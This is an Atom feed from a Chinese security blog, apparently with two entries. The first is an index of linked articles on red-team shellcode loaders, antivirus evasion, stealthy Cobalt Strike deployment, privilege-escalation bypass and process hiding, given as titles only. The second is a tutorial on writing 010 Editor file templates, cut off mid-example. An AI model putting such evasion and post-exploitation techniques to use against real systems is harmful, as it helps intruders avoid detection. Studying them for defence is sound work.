<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wonderkun&#39;s | blog</title>
  
  <subtitle>share with you!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.wonderkun.cc/"/>
  <updated>2024-11-18T11:46:14.718Z</updated>
  <id>http://blog.wonderkun.cc/</id>
  
  <author>
    <name>wonderkun</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安全的矛与盾-知识导航</title>
    <link href="http://blog.wonderkun.cc/2122/12/16/%E5%AE%89%E5%85%A8%E7%9A%84%E7%9F%9B%E4%B8%8E%E7%9B%BE-%E7%9F%A5%E8%AF%86%E5%AF%BC%E8%88%AA/"/>
    <id>http://blog.wonderkun.cc/2122/12/16/安全的矛与盾-知识导航/</id>
    <published>2122-12-16T08:16:34.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
    <content type="html"><![CDATA[<p>非常欢迎大家加入我的知识星球。</p><!-- ![](https://pic.wonderkun.cc//uploads/note/202205012323791.png) --><img src="https://pic.wonderkun.cc//uploads/note/202205012323791.png" width="50%" height="50%" /><p>以下列表是我在星球中做的一些技术分享，进入该索引的文章通常是我认为比较代表性必看的一类文章，基础知识部分包含了我认为是在本知识星球进行学习必备的知识，具备基础知识后的后续内容会按照分类整理依次整理，并及时更新。</p><p><strong>当前更新时间：2022年6月8日。</strong></p><a id="more"></a><h2 id="基础知识篇"><a href="#基础知识篇" class="headerlink" title="基础知识篇"></a>基础知识篇</h2><ul><li><a href="https://t.zsxq.com/02uRbuZrv" target="_blank" rel="noopener">CS的shellcode功能分析和代码重写实战</a></li></ul><h2 id="红队建设"><a href="#红队建设" class="headerlink" title="红队建设"></a>红队建设</h2><ul><li><a href="https://t.zsxq.com/02BeMFuzN" target="_blank" rel="noopener">精简JRE,打造无依赖的Java-ShellCode-Loader</a></li><li><a href="https://t.zsxq.com/uVJqj6u" target="_blank" rel="noopener">Jna加载shellcode优化</a></li><li><a href="https://t.zsxq.com/a23zfyR" target="_blank" rel="noopener">绕过安全软件对windows提权的拦截的方法</a></li><li><a href="https://t.zsxq.com/a23zfyR" target="_blank" rel="noopener">用一个技巧编写一段兼容x86和x64的shellcode</a></li><li><a href="https://t.zsxq.com/a23zfyR" target="_blank" rel="noopener">CobaltStrike隐匿性部署方案</a></li><li><a href="https://t.zsxq.com/aMz7y3v" target="_blank" rel="noopener">静态免杀实战</a></li><li><a href="https://t.zsxq.com/aMz7y3v" target="_blank" rel="noopener">从服务创建拦截看端上主防软件的工作原理和绕过方法</a></li><li><a href="https://t.zsxq.com/eIeYBUF" target="_blank" rel="noopener">windows服务工作原理和服务隐藏</a></li></ul><h3 id="红队免杀"><a href="#红队免杀" class="headerlink" title="红队免杀"></a>红队免杀</h3><ul><li><a href="https://www.anquanke.com/post/id/242548" target="_blank" rel="noopener">杀软的无奈——基础工具篇（一）</a></li><li><a href="https://www.anquanke.com/post/id/242549" target="_blank" rel="noopener">杀软的无奈-最简单的免杀（二）</a></li><li><a href="https://www.anquanke.com/post/id/242550" target="_blank" rel="noopener">杀软的无奈-metasploit的shellcode loader分析（三）</a></li><li><a href="https://www.anquanke.com/post/id/242551" target="_blank" rel="noopener">杀软的无奈-手工构建免杀的ELF文件（四）</a></li><li><a href="https://www.anquanke.com/post/id/248688" target="_blank" rel="noopener">杀软的无奈-构建更具有欺骗性的ELF文件（五）</a></li></ul><h2 id="检测逃避"><a href="#检测逃避" class="headerlink" title="检测逃避"></a>检测逃避</h2><ul><li><a href="https://t.zsxq.com/Vbaiuvr" target="_blank" rel="noopener">滥用具备RWX-S权限且有签名的dll进行无感知的shellcode注入</a></li><li><a href="https://t.zsxq.com/iqvJQbm" target="_blank" rel="noopener">浅谈php webshell的检测和防御</a></li><li><a href="https://t.zsxq.com/yVNjI2n" target="_blank" rel="noopener">linux样本对抗文件采集和沙箱分析的方法</a></li><li><a href="https://t.zsxq.com/yVNjI2n" target="_blank" rel="noopener">mount命令在对抗入侵检测时的用处</a></li><li><a href="https://t.zsxq.com/N7UVRrV" target="_blank" rel="noopener">ring3层干掉杀软的方法</a></li><li><a href="https://t.zsxq.com/rRBQZVN" target="_blank" rel="noopener">windows平台的进程链隐藏小技巧</a></li><li><a href="https://t.zsxq.com/rRBQZVN" target="_blank" rel="noopener">upx变形壳静态脱壳工具的诞生</a></li></ul><h2 id="蓝队技术"><a href="#蓝队技术" class="headerlink" title="蓝队技术"></a>蓝队技术</h2><ul><li><a href="https://t.zsxq.com/yvrNV7y" target="_blank" rel="noopener">MySql高交互反制蜜罐的工程化实现</a></li><li><a href="https://t.zsxq.com/yvrNV7y" target="_blank" rel="noopener">收集到的几种蓝队源码下毒反制方法</a></li></ul><h2 id="论文技术前瞻"><a href="#论文技术前瞻" class="headerlink" title="论文技术前瞻"></a>论文技术前瞻</h2><ul><li><a href="https://t.zsxq.com/Ay7aimM" target="_blank" rel="noopener">使用迁移学习进行二进制反汇编并识别函数</a></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul><li><a href="https://t.zsxq.com/eYJiEUj" target="_blank" rel="noopener">CVE-2021-22205 gitlab RCE preauth分析</a></li></ul><p><strong>持续更新中…</strong></p><h2 id="分享计划"><a href="#分享计划" class="headerlink" title="分享计划"></a>分享计划</h2><p>我的博客即将同步至腾讯云开发者社区，邀请大家一同入驻：<a href="https://cloud.tencent.com/developer/support-plan?invite_code=2x40wz1s57ggg" target="_blank" rel="noopener">https://cloud.tencent.com/developer/support-plan?invite_code=2x40wz1s57ggg</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;非常欢迎大家加入我的知识星球。&lt;/p&gt;
&lt;!-- ![](https://pic.wonderkun.cc//uploads/note/202205012323791.png) --&gt;

&lt;img src=&quot;https://pic.wonderkun.cc//uploads/note/202205012323791.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;

&lt;p&gt;以下列表是我在星球中做的一些技术分享，进入该索引的文章通常是我认为比较代表性必看的一类文章，基础知识部分包含了我认为是在本知识星球进行学习必备的知识，具备基础知识后的后续内容会按照分类整理依次整理，并及时更新。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当前更新时间：2022年6月8日。&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="blue &amp; red" scheme="http://blog.wonderkun.cc/tags/blue-red/"/>
    
      <category term="windows" scheme="http://blog.wonderkun.cc/tags/windows/"/>
    
      <category term="shellcode" scheme="http://blog.wonderkun.cc/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>010editor 模板编写笔记</title>
    <link href="http://blog.wonderkun.cc/2024/11/12/010editor%20%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/"/>
    <id>http://blog.wonderkun.cc/2024/11/12/010editor 模板编写/</id>
    <published>2024-11-12T08:16:34.000Z</published>
    <updated>2024-11-18T11:46:14.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="010editor-模板编写"><a href="#010editor-模板编写" class="headerlink" title="010editor 模板编写"></a>010editor 模板编写</h1><p>参考文档：<br><a href="https://www.sweetscape.com/010editor/manual/IntroTemplates.htm" target="_blank" rel="noopener">https://www.sweetscape.com/010editor/manual/IntroTemplates.htm</a></p><p><a href="https://bbs.pediy.com/thread-257797.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257797.htm</a></p><p><a href="https://lyana-nullptr.github.io/2024/07/27/try-the-template-of-010editor/" target="_blank" rel="noopener">https://lyana-nullptr.github.io/2024/07/27/try-the-template-of-010editor/</a></p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>模板文件的开头会有如下信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//</span>      <span class="attr">File:</span> </span><br><span class="line"><span class="string">//</span>   <span class="attr">Authors:</span> </span><br><span class="line"><span class="string">//</span>   <span class="attr">Version:</span> </span><br><span class="line"><span class="string">//</span>   <span class="attr">Purpose:</span> </span><br><span class="line"><span class="string">//</span>  <span class="attr">Category:</span> <span class="string">WeChat</span></span><br><span class="line"><span class="string">//</span> <span class="attr">File Mask:</span> <span class="string">*.wxapkg</span></span><br><span class="line"><span class="string">//</span>  <span class="attr">ID Bytes:</span> <span class="string">BE,</span> <span class="number">56</span> <span class="number">31</span> <span class="string">4D</span> <span class="string">4D</span> <span class="number">57</span> <span class="number">58</span></span><br><span class="line"><span class="string">//</span>   <span class="attr">History:</span></span><br></pre></td></tr></table></figure><p>程序会优先用File Mask匹配文件扩展名，再用ID Bytes匹配魔术数，匹配成功的话就会自动加载模板文件。</p><a id="more"></a><p>默认情况下，所有变量都会显示在模板窗口中。比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> x;</span><br><span class="line">   <span class="keyword">int</span> y;    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x &lt;bgcolor=<span class="number">0x0000FF</span>,format=hex&gt;;</span><br><span class="line"></span><br><span class="line">test a &lt;bgcolor=<span class="number">0x00FFFF</span>&gt;;</span><br></pre></td></tr></table></figure><p><img src="https://pic.wonderkun.cc//uploads/note/202411141132637.png" alt=""></p><p>可以通过local关键字定义变量，这样的变量默认不会显示在模板窗口中，不过用户任然可以在窗口中点击右键菜单中的Show Local Variables来显示局部变量。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该模板中定义了变量 a, b, c, d, e, f, g</span></span><br><span class="line"><span class="comment">// 枚举的变量类型为 “enum ENUM1 &#123; COMP_1 = 1, COMP_2 = 2, COMP_3 = 3 &#125;” 整体，结构体同理</span></span><br><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"><span class="built_in">float</span> b;</span><br><span class="line"><span class="built_in">double</span> c;</span><br><span class="line"><span class="built_in">string</span> d;</span><br><span class="line"><span class="built_in">int</span> e[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">enum</span> ENUM1 &#123; COMP_1 = <span class="number">1</span>, COMP_2 = <span class="number">2</span>, COMP_3 = <span class="number">3</span> &#125; f;</span><br><span class="line">struct STRUCT1 &#123; <span class="built_in">int</span> x; <span class="built_in">int</span> y; <span class="built_in">int</span> z; &#125; g;</span><br></pre></td></tr></table></figure><p>重复定义同名的变量将被视作定义一个数组变量，也可以通过循环语句和定义变量语句组合实现。如：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法 1，显示为：</span></span><br><span class="line"><span class="comment">// Name    Value   Start   Size    Type    Color   Comment</span></span><br><span class="line"><span class="comment">// a[0]    ...     0h      4h      int</span></span><br><span class="line"><span class="comment">// a[1]    ...     4h      4h      int</span></span><br><span class="line"><span class="comment">// a[2]    ...     8h      4h      int</span></span><br><span class="line"><span class="built_in">int</span> a[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法 2，效果相同</span></span><br><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法 3，效果相同</span></span><br><span class="line">local <span class="built_in">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量属性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt; format=hex|decimal|octal|binary,</span><br><span class="line">   fgcolor=&lt;color&gt;|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   bgcolor=&lt;color&gt;|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   style=&lt;style_name&gt;,</span><br><span class="line">   comment=<span class="string">"&lt;string&gt;"</span>|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   name=<span class="string">"&lt;string&gt;"</span>|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   <span class="built_in">open</span>=<span class="literal">true</span>|<span class="literal">false</span>|suppress,</span><br><span class="line">   hidden=<span class="literal">true</span>|<span class="literal">false</span>,</span><br><span class="line">   <span class="built_in">read</span>=&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   <span class="built_in">write</span>=&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   <span class="built_in">size</span>=&lt;number&gt;|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   optimize=<span class="literal">true</span>|<span class="literal">false</span>,</span><br><span class="line">   disasm=&lt;constant&gt;|&lt;function&gt;|(&lt;expression&gt;) &gt;</span><br></pre></td></tr></table></figure><p>format: 以某种进制格式显示，默认为十进制，显示在 Vlaue 栏<br>fgcolor: 设置字体色<br>bgcolor: 设置背景色<br>comment: 添加注释，显示在 Comment 栏<br>name: 替换显示的字符，默认为结构体中的变量名，显示在 Name 栏<br>open: 设置树形图是否展开，默认不展开<br>hidden: 设置是否隐藏，默认为不隐藏<br>read: 读回调，返回字符串并显示在 Vlaue 栏<br>write: 写回调，将读回调返回的字符写入结构体某个字段中<br>size: 按需执行，可节约系统内存</p><p>一些颜色值 ：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cBlack - <span class="number">0x000000</span></span><br><span class="line">cRed - <span class="number">0x0000ff</span></span><br><span class="line">cDkRed - <span class="number">0x000080</span></span><br><span class="line">cLtRed - <span class="number">0x8080ff</span></span><br><span class="line">cGreen - <span class="number">0x00ff00</span></span><br><span class="line">cDkGreen - <span class="number">0x008000</span></span><br><span class="line">cLtGreen - <span class="number">0x80ff80</span></span><br><span class="line">cBlue - <span class="number">0xff0000</span></span><br><span class="line">cDkBlue - <span class="number">0x800000</span></span><br><span class="line">cLtBlue - <span class="number">0xff8080</span></span><br><span class="line">cPurple - <span class="number">0xff00ff</span></span><br><span class="line">cDkPurple - <span class="number">0x800080</span></span><br><span class="line">cLtPurple - <span class="number">0xffe0ff</span></span><br><span class="line">cAqua - <span class="number">0xffff00</span></span><br><span class="line">cDkAqua - <span class="number">0x808000</span></span><br><span class="line">cLtAqua - <span class="number">0xffffe0</span></span><br><span class="line">cYellow - <span class="number">0x00ffff</span></span><br><span class="line">cDkYellow - <span class="number">0x008080</span></span><br><span class="line">cLtYellow - <span class="number">0x80ffff</span></span><br><span class="line">cDkGray - <span class="number">0x404040</span></span><br><span class="line">cGray - <span class="number">0x808080</span>,</span><br><span class="line">cSilver - <span class="number">0xc0c0c0</span>,</span><br><span class="line">cLtGray - <span class="number">0xe0e0e0</span></span><br><span class="line">cWhite - <span class="number">0xffffff</span></span><br><span class="line">cNone - <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure><p>帮助大伙更好的理解以上这几个特殊的属性，图 1 中的 1 处是 name 属性显示的字符，如果不指定 name 属性默认就是结构体中的变量名。2 处是 format 属性，默认是十进制，这里指定为 16 进制。3 处是背景颜色和字体颜色缩影，这里没设置颜色所以显示为空。4 处就是 comment 属性显示的位置。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202411141241455.png" alt=""></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>8字节 char byte CHAR BYTE uchar ubyte UCHAR UBYTE<br>16字节 short int16 SHORT INT16 ushort uint16 USHORT UINT16 WORD<br>32字节 int int32 long INT INT32 LONG uint uint32 ulong UINT UINT32 ULONG DWORD<br>64字节 int64 quad QUAD INT64 __int64 uint64 uquad UQUAD UINT64 __uint64 QWORD<br>浮点 float FLOAT double DOUBLE hfloat HFLOAT<br>其他 DOSDATE DOSTIME FILETIME OLETIME time_t</p><p>使用:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> MYENUM &#123; COMP_1, COMP_2 = <span class="number">5</span>, COMP_3 &#125; var1;</span><br><span class="line"><span class="keyword">enum</span> &lt;ushort&gt; MYENUM &#123; COMP_1, COMP_2 = <span class="number">5</span>, COMP_3 &#125; var1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> myArray[<span class="number">15</span>];</span><br><span class="line"><span class="keyword">int</span> myArray[ FileSize() - myInt * <span class="number">0x10</span> + (<span class="number">17</span> &lt;&lt; <span class="number">5</span>) ];<span class="comment">//大小可以是变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">15</span>] = <span class="string">"First"</span>;  </span><br><span class="line"><span class="built_in">string</span> s = <span class="string">"Second"</span>;  </span><br><span class="line"><span class="built_in">string</span> r1 = str + s;  </span><br><span class="line"><span class="built_in">string</span> r2 = str;  </span><br><span class="line">r2 += s;  </span><br><span class="line"><span class="keyword">return</span> (r1 == r2);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 宽字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">wchar_t</span> str1[<span class="number">15</span>] = <span class="string">L"How now"</span>;  </span><br><span class="line"><span class="built_in">wstring</span> str2 = <span class="string">"brown cow"</span>;  </span><br><span class="line"><span class="built_in">wstring</span> str3 = str1 + <span class="string">L' '</span> + str2 + <span class="string">L'?'</span></span><br></pre></td></tr></table></figure><h3 id="控制语句和函数"><a href="#控制语句和函数" class="headerlink" title="控制语句和函数"></a>控制语句和函数</h3><p>支持 for,if,while,switch</p><p>函数参数可以通过值或引用传递，010editor脚本不支持指针，但是可以用[]表示数组<br>程序中不需要main函数，代码从第一行开始执行 </p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>sizeof<br>startof 用于计算变量起始地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetCursorPos( <span class="name">startof</span>( <span class="name">lines</span>[<span class="number">0</span>] ) )<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>exists 检查某变量是否声明</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;  </span><br><span class="line"><span class="keyword">string</span> s;  </span><br><span class="line"><span class="keyword">while</span>( <span class="keyword">exists</span>( <span class="keyword">file</span>[i] ) )  </span><br><span class="line">&#123;  </span><br><span class="line">s = <span class="keyword">file</span>[i].frFileName;  </span><br><span class="line">Printf( <span class="string">"%s\n"</span>, s );  </span><br><span class="line">i++;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>function_exists 检查函数是否定义</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">( function_exists(CopyStringToClipboard)</span></span> )  </span><br><span class="line">&#123;  </span><br><span class="line">...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this 引用当前结构体</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void <span class="constructor">PrintHeader( <span class="params">struct</span> HEADER &amp;<span class="params">h</span> )</span>  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="constructor">Printf( <span class="string">"ID1 = %d\n"</span>, <span class="params">h</span>.ID1 )</span>;  </span><br><span class="line"><span class="constructor">Printf( <span class="string">"ID2 = %d\n"</span>, <span class="params">h</span>.ID2 )</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">struct</span> HEADER  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">int</span> ID1;  </span><br><span class="line"><span class="built_in">int</span> ID2;  </span><br><span class="line"><span class="constructor">PrintHeader( <span class="params">this</span> )</span>;  </span><br><span class="line">&#125; h1;</span><br></pre></td></tr></table></figure><p>parentof 访问包含变量的结构和union</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void <span class="constructor">PrintHeader( <span class="params">struct</span> HEADER &amp;<span class="params">h</span> )</span>  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="constructor">Printf( <span class="string">"ID1 = %d\n"</span>, <span class="params">h</span>.ID1 )</span>;  </span><br><span class="line"><span class="constructor">Printf( <span class="string">"ID2 = %d\n"</span>, <span class="params">h</span>.ID2 )</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">struct</span> HEADER  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">int</span> ID1;  </span><br><span class="line"><span class="built_in">int</span> ID2;  </span><br><span class="line"><span class="keyword">struct</span> SUBITEM  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">int</span> data1;  </span><br><span class="line"><span class="built_in">int</span> data2;  </span><br><span class="line"><span class="constructor">PrintHeader( <span class="params">parentof</span>(<span class="params">this</span>)</span> );  </span><br><span class="line">&#125; item1;  </span><br><span class="line"><span class="constructor">PrintHeader( <span class="params">parentof</span>(<span class="params">item1</span>)</span> );  </span><br><span class="line">&#125; h1;</span><br></pre></td></tr></table></figure><h2 id="大小端以及其他设置"><a href="#大小端以及其他设置" class="headerlink" title="大小端以及其他设置"></a>大小端以及其他设置</h2><p>默认随系统，比如在 Windows 下是按照小端模式，通过BigEndian和LittleEndian来调整读取方式。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">BigEndian()</span>;    <span class="comment">// 转换为大端模式</span></span><br><span class="line"><span class="built_in">int</span> x;</span><br><span class="line"><span class="constructor">LittleEndian()</span>; <span class="comment">// 转换为小端模式</span></span><br></pre></td></tr></table></figure><ul><li>color设置</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> id &lt;fgcolor=cBlack, bgcolor=<span class="number">0x0000FF</span>&gt;;  </span><br><span class="line"><span class="constructor">SetForeColor( <span class="params">cRed</span> )</span>;  </span><br><span class="line"><span class="built_in">int</span> first; <span class="comment">// will be colored red  </span></span><br><span class="line"><span class="built_in">int</span> second; <span class="comment">// will be colored red  </span></span><br><span class="line"><span class="constructor">SetForeColor( <span class="params">cNone</span> )</span>;  </span><br><span class="line"><span class="built_in">int</span> third; <span class="comment">// will not be colored</span></span><br></pre></td></tr></table></figure><h2 id="脚本终止"><a href="#脚本终止" class="headerlink" title="脚本终止"></a>脚本终止</h2><p>如果在执行过程中发现脚本结构不对时可以提前结束，使用return语句即可，我们把整个脚本文件看作是一个C函数，用return就可以提前退出函数。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="built_in">string</span> magic = ReadString(<span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (magic == <span class="string">"Hello"</span>) &#123;</span><br><span class="line">  Printf(<span class="string">"无法解析加密文件"</span>);</span><br><span class="line"><span class="built_in">  return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结构体扩展"><a href="#结构体扩展" class="headerlink" title="结构体扩展"></a>结构体扩展</h2><h3 id="结构体构造函数"><a href="#结构体构造函数" class="headerlink" title="结构体构造函数"></a>结构体构造函数</h3><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> (<span class="built_in">uint</span> offset) &#123;</span><br><span class="line">  <span class="built_in">uint</span> x;</span><br><span class="line">&#125; FILE;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FILE</span> <span class="built_in">f</span>(123);</span><br></pre></td></tr></table></figure><h3 id="结构体表达式"><a href="#结构体表达式" class="headerlink" title="结构体表达式"></a>结构体表达式</h3><p>有时候结构体不是固定长度，而是根据字段的值来决定的</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  FILE_NAME fileName<span class="comment">;</span></span><br><span class="line">  uint offset<span class="comment">;</span></span><br><span class="line">  uint size<span class="comment">;</span></span><br><span class="line">  </span><br><span class="line">  if (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    local int64 pos = FTell()<span class="comment">;</span></span><br><span class="line">    FSeek(offset)<span class="comment">;</span></span><br><span class="line">    uchar data[size]<span class="comment">;</span></span><br><span class="line">    FSeek(pos)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125; FILE_INFO &lt;comment=fileName.fileName&gt;<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>甚至可以直接按照下面写法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> length;       <span class="comment">// 读取长度字段（4 字节）</span></span><br><span class="line">    local <span class="keyword">unsigned</span> <span class="keyword">int</span> c = length +<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> data[c];   <span class="comment">// 读取长度为 length 的字符串</span></span><br><span class="line">&#125; MyData;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化结构，以便解析文件</span></span><br><span class="line">MyData 